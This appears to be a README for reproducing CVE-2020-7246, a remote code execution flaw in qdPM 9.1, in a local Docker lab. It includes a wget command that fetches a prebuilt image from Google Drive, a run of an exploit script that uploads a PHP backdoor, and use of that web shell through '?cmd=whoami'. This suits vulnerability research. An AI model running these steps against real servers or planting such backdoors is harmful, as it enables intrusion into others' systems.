# CVE-2020-7246

## About
* <https://nvd.nist.gov/vuln/detail/CVE-2020-7246>


## PoC / Exploit
 * <https://docs.google.com/document/d/13ZZSm0DL1Ie6r_fU5ZdDKGZ4defFqiFXMG--zDo8S10/edit>
 * <https://www.exploit-db.com/exploits/47954>

## Environment used
* Ubuntu 18.04 LTS
* qdPM 9.1

## Requirements
* docker
## Reproduction 
Commands to build the environment
```shell script
wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1vVdqaDV3qBrz2zKLG01kHfmvOCa0X4rM' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1vVdqaDV3qBrz2zKLG01kHfmvOCa0X4rM" -O CVE-2020-7246.dockerimage.tar.gz && rm -rf /tmp/cookies.txt 
docker load -i CVE-2020-7246.dockerimage.tar.gz
docker run -it -p 8080:80 cve20207246
```
Command to inject malicious php file
```shell script
python3 qdPM-exploit.py -url http://localhost:8080/ -u teste@localhost.com -p teste
```
* Next open the browser on the following link: <http://localhost:8080//uploads/users/>
* Select one of the php files of the format *-backdoor.php, getting a url in the format of <http://localhost:8080//uploads/users/*-backdoor.php>
* Add the ``` ?cmd=whoami ``` at the end of the url and ``` www-data ``` should appear as the response